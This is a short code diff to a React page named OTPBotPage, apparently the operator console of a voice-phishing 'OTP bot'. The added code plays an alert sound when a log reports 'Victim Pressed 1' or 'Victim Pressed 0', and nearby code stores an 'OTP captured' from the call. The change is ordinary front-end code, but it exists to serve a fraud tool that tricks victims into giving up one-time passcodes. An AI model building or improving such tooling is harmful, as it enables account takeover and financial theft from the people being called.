@@ -133,6 +133,13 @@ const OTPBotPage = () => {
             console.log('Log received:', log);
             setLogs(prev => [...prev, log]);
             
+            // Play notification sound for Victim Pressed 1 or 0
+            if (log.type === 'warning' && (log.message.includes('Victim Pressed 1') || log.message.includes('Victim Pressed 0'))) {
+                const audio = new Audio('/notification-sound.wav');
+                audio.volume = 0.7;
+                audio.play().catch(err => console.log('Audio play failed:', err));
+            }
+            
             // Handle OTP captured
             if (log.type === 'otp' && log.data?.otp) {
                 setOtpReceived(log.data.otp);
